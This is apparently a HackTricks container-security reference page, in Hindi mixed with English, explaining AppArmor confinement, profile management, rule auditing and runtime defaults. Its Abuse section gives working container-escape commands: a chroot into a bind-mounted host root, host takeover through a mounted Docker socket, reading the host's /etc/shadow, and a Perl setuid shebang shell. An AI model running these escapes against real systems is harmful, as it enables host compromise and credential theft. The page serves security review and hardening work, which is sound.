# AppArmor

{{#include ../../../../banners/hacktricks-training.md}}

## Container Isolation में भूमिका

AppArmor एक **Mandatory Access Control** system है, जो प्रत्येक program के लिए बनाए गए profiles के माध्यम से restrictions लागू करता है। Traditional DAC checks के विपरीत, जो user और group ownership पर काफी निर्भर करते हैं, AppArmor kernel को process से जुड़े policy को लागू करने की अनुमति देता है। Container environments में यह महत्वपूर्ण है, क्योंकि किसी workload के पास किसी action का प्रयास करने के लिए पर्याप्त traditional privilege हो सकता है, फिर भी उसे deny किया जा सकता है क्योंकि उसका AppArmor profile संबंधित path, mount, network behavior या capability के उपयोग की अनुमति नहीं देता।

सबसे महत्वपूर्ण conceptual point यह है कि AppArmor **path-based** है। यह SELinux की तरह labels के माध्यम से नहीं, बल्कि path rules के आधार पर filesystem access का विश्लेषण करता है। इससे इसे समझना आसान और शक्तिशाली बनता है, लेकिन इसका अर्थ यह भी है कि bind mounts और alternate path layouts पर सावधानीपूर्वक ध्यान देना आवश्यक है। यदि वही host content किसी अलग path के माध्यम से accessible हो जाता है, तो policy का प्रभाव operator की पहली अपेक्षा के अनुसार नहीं हो सकता।

## Container Isolation में भूमिका

Container security reviews अक्सर capabilities और seccomp तक सीमित रह जाते हैं, लेकिन उन checks के बाद भी AppArmor महत्वपूर्ण बना रहता है। मान लें कि किसी container के पास आवश्यकता से अधिक privilege है, या किसी workload को operational reasons से एक अतिरिक्त capability की आवश्यकता थी। AppArmor तब भी file access, mount behavior, networking और execution patterns को इस तरह constrain कर सकता है कि obvious abuse path रुक जाए। इसी कारण AppArmor को "just to get the application working" disable करना, किसी merely risky configuration को चुपचाप actively exploitable configuration में बदल सकता है।

## Lab

Host पर AppArmor active है या नहीं, यह check करने के लिए उपयोग करें:
```bash
aa-status 2>/dev/null || apparmor_status 2>/dev/null
cat /sys/module/apparmor/parameters/enabled 2>/dev/null
```
यह देखने के लिए कि वर्तमान container process किसके अंतर्गत चल रही है:
```bash
docker run --rm ubuntu:24.04 cat /proc/self/attr/current
docker run --rm --security-opt apparmor=unconfined ubuntu:24.04 cat /proc/self/attr/current
```
अंतर शिक्षाप्रद है। सामान्य स्थिति में, process को runtime द्वारा चुने गए profile से जुड़ा AppArmor context दिखना चाहिए। unconfined स्थिति में, restriction की वह अतिरिक्त layer समाप्त हो जाती है।

आप यह भी inspect कर सकते हैं कि Docker के अनुसार उसने क्या लागू किया:
```bash
docker inspect <container> | jq '.[0].AppArmorProfile'
```
## Runtime Usage

जब host इसे support करता है, तो Docker एक default या custom AppArmor profile लागू कर सकता है। Podman भी AppArmor-आधारित systems पर AppArmor के साथ integrate कर सकता है, हालांकि SELinux-first distributions में अक्सर दूसरा MAC system प्रमुख भूमिका निभाता है। Kubernetes उन nodes पर workload level पर AppArmor policy expose कर सकता है जो वास्तव में AppArmor support करते हैं। LXC और उससे संबंधित Ubuntu-family system-container environments भी AppArmor का व्यापक रूप से उपयोग करते हैं।

व्यावहारिक बात यह है कि AppArmor कोई "Docker feature" नहीं है। यह host-kernel feature है, जिसे कई runtimes लागू करना चुन सकते हैं। यदि host इसे support नहीं करता या runtime को unconfined चलाने के लिए कहा गया है, तो अपेक्षित protection वास्तव में मौजूद नहीं होती।

Kubernetes के लिए विशेष रूप से modern API `securityContext.appArmorProfile` है। Kubernetes `v1.30` से पुराने beta AppArmor annotations deprecated हैं। Supported hosts पर `RuntimeDefault` default profile होता है, जबकि `Localhost` ऐसे profile की ओर संकेत करता है जो node पर पहले से loaded होना चाहिए। Review के दौरान यह महत्वपूर्ण है, क्योंकि कोई manifest AppArmor-aware दिखाई दे सकता है, जबकि वह पूरी तरह node-side support और preloaded profiles पर निर्भर हो सकता है।

एक सूक्ष्म लेकिन उपयोगी operational detail यह है कि `appArmorProfile.type: RuntimeDefault` को explicitly set करना field को केवल omit करने से अधिक strict होता है। यदि field explicitly set है और node AppArmor support नहीं करता, तो admission fail होना चाहिए। यदि field omitted है, तो workload AppArmor के बिना किसी node पर भी चल सकता है और उसे यह अतिरिक्त confinement layer नहीं मिलती। Attacker के दृष्टिकोण से, यह manifest और actual node state दोनों की जांच करने का अच्छा कारण है।

AppArmor-capable Docker hosts पर सबसे प्रसिद्ध default `docker-default` है। यह profile Moby के AppArmor template से generate होता है और महत्वपूर्ण है, क्योंकि यह समझाता है कि default container में कुछ capability-based PoCs अभी भी क्यों fail होते हैं। व्यापक रूप से, `docker-default` ordinary networking की अनुमति देता है, `/proc` के बड़े हिस्से में writes को deny करता है, `/sys` के sensitive हिस्सों तक access को deny करता है, mount operations को block करता है और ptrace को restrict करता है, ताकि यह general host-probing primitive न बन सके। इस baseline को समझने से `"container has `CAP_SYS_ADMIN`"` और `"container can actually use that capability against the kernel interfaces I care about"` के बीच अंतर स्पष्ट करने में सहायता मिलती है।

## Profile Management

AppArmor profiles आमतौर पर `/etc/apparmor.d/` के अंतर्गत stored होते हैं। एक सामान्य naming convention में executable path के slashes को dots से replace किया जाता है। उदाहरण के लिए, `/usr/bin/man` के लिए profile आमतौर पर `/etc/apparmor.d/usr.bin.man` के रूप में stored होता है। यह detail defense और assessment दोनों के दौरान महत्वपूर्ण है, क्योंकि active profile name पता होने पर आप अक्सर host पर संबंधित file को जल्दी locate कर सकते हैं।

Useful host-side management commands में शामिल हैं:
```bash
aa-status
aa-enforce
aa-complain
apparmor_parser
aa-genprof
aa-logprof
aa-mergeprof
```
इन commands का container-security reference में महत्व इसलिए है क्योंकि ये बताते हैं कि profiles वास्तव में कैसे बनाए, load किए, complain mode में switch किए और application में बदलावों के बाद modify किए जाते हैं। यदि कोई operator troubleshooting के दौरान profiles को complain mode में ले जाने और enforcement को फिर से restore करना भूलने का आदी है, तो documentation में container protected दिखाई दे सकता है, जबकि वास्तविकता में वह कहीं अधिक loosely व्यवहार कर रहा हो।

### Profiles बनाना और अपडेट करना

`aa-genprof` application के behavior को observe कर सकता है और interactive तरीके से profile generate करने में सहायता कर सकता है:
```bash
sudo aa-genprof /path/to/binary
/path/to/binary
```
`aa-easyprof` एक template profile generate कर सकता है, जिसे बाद में `apparmor_parser` से load किया जा सकता है:
```bash
sudo aa-easyprof /path/to/binary
sudo apparmor_parser -a /etc/apparmor.d/path.to.binary
```
जब binary में बदलाव होता है और policy को अपडेट करने की आवश्यकता होती है, तो `aa-logprof` logs में मिली denials को दोबारा चला सकता है और operator को उन्हें allow या deny करने का निर्णय लेने में सहायता कर सकता है:
```bash
sudo aa-logprof
```
### लॉग्स

AppArmor denials अक्सर `auditd`, syslog या `aa-notify` जैसे tools के माध्यम से दिखाई देते हैं:
```bash
sudo aa-notify -s 1 -v
```
यह operationally और offensively उपयोगी है। Defenders इसका उपयोग profiles को refine करने के लिए करते हैं। Attackers इसका उपयोग यह जानने के लिए करते हैं कि किस exact path या operation को deny किया जा रहा है और क्या AppArmor वह control है जो exploit chain को block कर रहा है।

### Exact Profile File की पहचान

जब कोई runtime किसी container के लिए एक specific AppArmor profile name दिखाता है, तो उस name को disk पर मौजूद profile file से map करना अक्सर उपयोगी होता है:
```bash
docker inspect <container> | grep AppArmorProfile
find /etc/apparmor.d/ -maxdepth 1 -name '*<profile-name>*' 2>/dev/null
```
यह विशेष रूप से host-side review के दौरान उपयोगी है, क्योंकि यह "`lowpriv` profile के अंतर्गत चल रहा है" कहने वाले container और "वास्तविक rules इसी specific file में मौजूद हैं, जिसका audit या reload किया जा सकता है" के बीच का अंतर समाप्त करता है।

### Audit करने योग्य High-Signal Rules

जब आप कोई profile पढ़ सकते हों, तो केवल साधारण `deny` lines पर न रुकें। कई rule types यह महत्वपूर्ण रूप से बदल देते हैं कि container escape attempt के विरुद्ध AppArmor कितना उपयोगी होगा:

- `ux` / `Ux`: target binary को unconfined execute करता है। यदि कोई reachable helper, shell या interpreter `ux` के अंतर्गत allowed है, तो आमतौर पर सबसे पहले उसी को test करना चाहिए।
- `px` / `Px` और `cx` / `Cx`: exec पर profile transitions करते हैं। ये अपने-आप में हमेशा bad नहीं होते, लेकिन इनका audit करना आवश्यक है, क्योंकि transition वर्तमान profile से कहीं अधिक व्यापक profile में ले जा सकता है।
- `change_profile`: किसी task को दूसरे loaded profile में तुरंत या अगले exec पर switch करने की अनुमति देता है। यदि destination profile कमजोर है, तो यह restrictive domain से बाहर निकलने का intended escape hatch बन सकता है।
- `flags=(complain)`, `flags=(unconfined)`, या नए `flags=(prompt)`: इनसे यह बदलना चाहिए कि आप profile पर कितना trust रखते हैं। `complain` denials को enforce करने के बजाय log करता है, `unconfined` boundary को हटा देता है, और `prompt` pure kernel-enforced deny के बजाय userspace decision path पर निर्भर करता है।
- `userns` या `userns create,`: नए AppArmor policy user namespaces के creation को mediate कर सकते हैं। यदि कोई container profile इसे explicitly allow करता है, तो nested user namespaces उपयोग में बने रहते हैं, भले ही platform अपनी hardening strategy के हिस्से के रूप में AppArmor का उपयोग करता हो।

Useful host-side grep:
```bash
grep -REn '(^|[[:space:]])(ux|Ux|px|Px|cx|Cx|pix|Pix|cix|Cix|pux|PUx|cux|CUx|change_profile|userns)\b|flags=\(.*(complain|unconfined|prompt).*\)' /etc/apparmor.d 2>/dev/null
```
इस प्रकार का audit अक्सर सैकड़ों सामान्य file rules को देखते रहने से कहीं अधिक उपयोगी होता है। यदि breakout किसी helper को execute करने, नए namespace में प्रवेश करने, या कम restrictive profile में escape करने पर निर्भर करता है, तो इसका उत्तर अक्सर स्पष्ट `deny /etc/shadow r` जैसी lines में नहीं, बल्कि इन transition-oriented rules में छिपा होता है।

## Misconfigurations

सबसे स्पष्ट गलती `apparmor=unconfined` है। Administrators अक्सर इसे तब सेट करते हैं, जब कोई application इसलिए fail हो जाती है क्योंकि profile ने किसी खतरनाक या अप्रत्याशित चीज़ को सही तरीके से block कर दिया होता है। यदि यह flag production में बना रहता है, तो पूरी MAC layer प्रभावी रूप से हटा दी जाती है।

एक अन्य सूक्ष्म समस्या यह मान लेना है कि bind mounts harmless हैं क्योंकि file permissions सामान्य दिखती हैं। चूंकि AppArmor path-based है, इसलिए alternate mount locations के अंतर्गत host paths को expose करना path rules के साथ खराब तरीके से interact कर सकता है। तीसरी गलती यह भूलना है कि config file में profile name का कोई विशेष अर्थ नहीं है, यदि host kernel वास्तव में AppArmor को enforce नहीं कर रहा हो।

## Abuse

जब AppArmor हट जाता है, तो वे operations अचानक काम कर सकते हैं जो पहले constrained थे: bind mounts के माध्यम से sensitive paths को पढ़ना, procfs या sysfs के उन हिस्सों तक पहुंचना जिन्हें उपयोग करना अधिक कठिन रहना चाहिए था, capabilities/seccomp की अनुमति होने पर mount-related actions करना, या उन paths का उपयोग करना जिन्हें profile सामान्यतः deny कर देता। AppArmor अक्सर वह mechanism होता है जो बताता है कि capability-based breakout attempt कागज़ पर "should work" क्यों लगता है, लेकिन व्यवहार में फिर भी fail हो जाता है। AppArmor हटा दें, और वही attempt सफल होना शुरू हो सकता है।

यदि आपको संदेह है कि path-traversal, bind-mount, या mount-based abuse chain को रोकने वाली मुख्य चीज़ AppArmor है, तो पहला कदम आमतौर पर यह तुलना करना होता है कि profile के साथ और उसके बिना क्या accessible हो जाता है। उदाहरण के लिए, यदि कोई host path container के अंदर mounted है, तो पहले यह जांचना शुरू करें कि क्या आप उसमें traverse और उसे read कर सकते हैं:
```bash
cat /proc/self/attr/current
find /host -maxdepth 2 -ls 2>/dev/null | head
find /host/etc -maxdepth 1 -type f 2>/dev/null | head
```
यदि container में `CAP_SYS_ADMIN` जैसी कोई dangerous capability भी है, तो सबसे व्यावहारिक tests में से एक यह जांचना है कि क्या AppArmor mount operations या sensitive kernel filesystems तक access को रोकने वाला control है:
```bash
capsh --print | grep cap_sys_admin
mount | head
mkdir -p /tmp/testmnt
mount -t proc proc /tmp/testmnt 2>/dev/null || echo "mount blocked"
mount -t tmpfs tmpfs /tmp/testmnt 2>/dev/null || echo "tmpfs blocked"
```
ऐसे environments में जहाँ कोई host path पहले से ही bind mount के माध्यम से उपलब्ध है, AppArmor के हट जाने से read-only information-disclosure issue भी direct host file access में बदल सकता है:
```bash
ls -la /host/root 2>/dev/null
cat /host/etc/shadow 2>/dev/null | head
find /host/var/run -maxdepth 2 -name '*.sock' 2>/dev/null
```
इन commands का उद्देश्य यह नहीं है कि AppArmor अकेले breakout करता है। बात यह है कि AppArmor हटाए जाने के बाद, filesystem और mount-आधारित कई abuse paths तुरंत test किए जा सकते हैं।

### पूर्ण उदाहरण: AppArmor Disabled + Host Root Mounted

यदि container में host root पहले से `/host` पर bind-mounted है, तो AppArmor हटाने से blocked filesystem abuse path एक complete host escape में बदल सकता है:
```bash
cat /proc/self/attr/current
ls -la /host
chroot /host /bin/bash 2>/dev/null || /host/bin/bash -p
```
जब shell host filesystem के माध्यम से execute हो रहा होता है, तो workload प्रभावी रूप से container boundary से बाहर निकल चुका होता है:
```bash
id
hostname
cat /etc/shadow | head
```
### पूर्ण उदाहरण: AppArmor Disabled + Runtime Socket

यदि वास्तविक बाधा runtime state के चारों ओर AppArmor थी, तो complete escape के लिए एक mounted socket पर्याप्त हो सकता है:
```bash
find /host/run /host/var/run -maxdepth 2 -name docker.sock 2>/dev/null
docker -H unix:///host/var/run/docker.sock run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
```
सटीक path mount point पर निर्भर करता है, लेकिन अंतिम परिणाम समान होता है: AppArmor अब runtime API तक पहुंच को रोक नहीं रहा है, और runtime API host-compromising container लॉन्च कर सकता है।

### Full Example: Path-Based Bind-Mount Bypass

AppArmor path-based होने के कारण, `/proc/**` को सुरक्षित करने से उसी host procfs content की सुरक्षा अपने-आप नहीं होती, जब वह किसी अलग path के माध्यम से उपलब्ध हो:
```bash
mount | grep '/host/proc'
find /host/proc/sys -maxdepth 3 -type f 2>/dev/null | head -n 20
cat /host/proc/sys/kernel/core_pattern 2>/dev/null
```
प्रभाव इस बात पर निर्भर करता है कि वास्तव में क्या mounted है और क्या alternate path अन्य controls को भी bypass करता है, लेकिन यह pattern उन सबसे स्पष्ट कारणों में से एक है जिनकी वजह से AppArmor का मूल्यांकन mount layout के साथ किया जाना चाहिए, न कि अलग-अलग।

### पूर्ण उदाहरण: Shebang Bypass

AppArmor policy कभी-कभी interpreter path को इस तरह target करती है कि shebang handling के माध्यम से script execution को पूरी तरह ध्यान में नहीं रखा जाता। एक ऐतिहासिक उदाहरण में ऐसी script का उपयोग शामिल था जिसकी पहली line एक confined interpreter की ओर संकेत करती है:
```bash
cat <<'EOF' > /tmp/test.pl
#!/usr/bin/perl
use POSIX qw(setuid);
POSIX::setuid(0);
exec "/bin/sh";
EOF
chmod +x /tmp/test.pl
/tmp/test.pl
```
इस तरह का उदाहरण यह याद दिलाने के लिए महत्वपूर्ण है कि profile का intent और वास्तविक execution semantics अलग हो सकते हैं। Container environments में AppArmor की समीक्षा करते समय, interpreter chains और alternate execution paths पर विशेष ध्यान देना चाहिए।

## जांच

इन checks का लक्ष्य तीन प्रश्नों का शीघ्र उत्तर देना है: क्या host पर AppArmor enabled है, क्या current process confined है, और क्या runtime ने वास्तव में इस container पर कोई profile लागू किया है?
```bash
cat /proc/self/attr/current                         # Current AppArmor label for this process
aa-status 2>/dev/null                              # Host-wide AppArmor status and loaded/enforced profiles
docker inspect <container> | jq '.[0].AppArmorProfile'   # Profile the runtime says it applied
find /etc/apparmor.d -maxdepth 1 -type f 2>/dev/null | head -n 50   # Host-side profile inventory when visible
cat /sys/kernel/security/apparmor/profiles 2>/dev/null | sort | head -n 50   # Loaded profiles straight from securityfs
grep -REn '(^|[[:space:]])(ux|Ux|px|Px|cx|Cx|pix|Pix|cix|Cix|pux|PUx|cux|CUx|change_profile|userns)\b|flags=\(.*(complain|unconfined|prompt).*\)' /etc/apparmor.d 2>/dev/null
```
यहाँ क्या महत्वपूर्ण है:

- यदि `/proc/self/attr/current` `unconfined` दिखाता है, तो workload को AppArmor confinement का लाभ नहीं मिल रहा है।
- यदि `aa-status` AppArmor को disabled या not loaded दिखाता है, तो runtime config में मौजूद कोई भी profile name मुख्यतः cosmetic है।
- यदि `docker inspect` `unconfined` या कोई अप्रत्याशित custom profile दिखाता है, तो अक्सर यही कारण होता है कि filesystem या mount-based abuse path काम करता है।
- यदि `/sys/kernel/security/apparmor/profiles` में अपेक्षित profile मौजूद नहीं है, तो केवल runtime या orchestrator configuration पर्याप्त नहीं है।
- यदि supposedly hardened profile में `ux`, broad `change_profile`, `userns`, या `flags=(complain)` जैसी rules हैं, तो practical boundary profile name से दिखाई देने वाली सीमा से कहीं कमजोर हो सकती है।

यदि किसी container के पास operational reasons से पहले ही elevated privileges हैं, तो AppArmor को enabled रखना controlled exception और कहीं अधिक व्यापक security failure के बीच अंतर पैदा कर सकता है।

## Runtime Defaults

| Runtime / platform | Default state | Default behavior | Common manual weakening |
| --- | --- | --- | --- |
| Docker Engine | AppArmor-capable hosts पर default रूप से Enabled | Override न किए जाने पर `docker-default` AppArmor profile का उपयोग करता है | `--security-opt apparmor=unconfined`, `--security-opt apparmor=<profile>`, `--privileged` |
| Podman | Host-dependent | AppArmor को `--security-opt` के माध्यम से support करता है, लेकिन exact default host/runtime पर निर्भर करता है और Docker के documented `docker-default` profile जितना universal नहीं है | `--security-opt apparmor=unconfined`, `--security-opt apparmor=<profile>`, `--privileged` |
| Kubernetes | Conditional default | यदि `appArmorProfile.type` specified नहीं है, तो default `RuntimeDefault` होता है, लेकिन यह केवल तब लागू होता है जब node पर AppArmor enabled हो | `securityContext.appArmorProfile.type: Unconfined`, कमजोर profile के साथ `securityContext.appArmorProfile.type: Localhost`, AppArmor support के बिना nodes |
| containerd / CRI-O under Kubernetes | Node/runtime support को follow करता है | Common Kubernetes-supported runtimes AppArmor को support करते हैं, लेकिन actual enforcement अब भी node support और workload settings पर निर्भर करता है | Kubernetes row के समान; direct runtime configuration AppArmor को पूरी तरह skip भी कर सकती है |

AppArmor के लिए सबसे महत्वपूर्ण variable अक्सर केवल runtime नहीं, बल्कि **host** होता है। किसी manifest में profile setting ऐसे node पर confinement create नहीं करती जहाँ AppArmor enabled नहीं है।

## References

- [Kubernetes security context: AppArmor profile fields and node-support behavior](https://kubernetes.io/docs/tasks/configure-pod-container/security-context/)
- [Ubuntu 24.04 `apparmor.d(5)` manpage: exec transitions, `change_profile`, `userns`, and profile flags](https://manpages.ubuntu.com/manpages/noble/en/man5/apparmor.d.5.html)
{{#include ../../../../banners/hacktricks-training.md}}
